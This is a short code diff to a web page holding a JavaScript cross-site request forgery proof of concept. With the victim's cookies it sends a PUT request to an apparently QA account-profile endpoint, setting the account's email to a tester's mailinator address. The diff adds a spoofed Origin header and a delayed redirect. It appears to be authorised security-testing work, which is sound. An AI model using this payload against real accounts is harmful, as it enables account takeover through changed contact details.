@@ -7,8 +7,11 @@
 
         <script>
             function JSON_CSRF() {
-                fetch('https://account-qa.hrblock.com/gateway/profile/updateprofile', { method: 'PUT', credentials: 'include', headers: { 'Content-Type': 'application/json' }, body: '{"emailAddresses":[{"type":"Personal Email","email":"appsectester619@mailinator.com"}]}' });
-				window.location.href="https://account-qa.hrblock.com/"
+                fetch('https://account-qa.hrblock.com/gateway/profile/updateprofile', { method: 'PUT', credentials: 'include', headers: { 'Content-Type': 'application/json' , 'Origin':'https://test.com' }, body: '{"emailAddresses":[{"type":"Personal Email","email":"appsectester619@mailinator.com"}]}' })
+.then(() => {
+    setTimeout(() => window.location.href = "https://account-qa.hrblock.com/", 10000);
+});
+;
 			}
         </script>
 
